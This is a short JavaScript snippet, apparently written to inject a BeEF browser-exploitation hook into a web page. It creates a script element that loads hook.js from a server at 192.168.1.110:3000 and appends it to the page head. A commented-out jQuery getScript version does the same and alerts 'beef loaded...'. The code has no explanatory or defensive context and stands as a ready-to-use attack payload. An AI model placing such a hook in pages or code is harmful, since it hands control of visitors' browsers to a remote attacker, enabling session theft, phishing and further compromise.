//$(function(){
	/*$.getScript('http://192.168.1.110:3000/hook.js', function(){
		alert('beef loaded...');	
	});*/
	var imported = document.createElement('script');
	imported.src = 'http://192.168.1.110:3000/hook.js';
	document.head.appendChild(imported);
//});
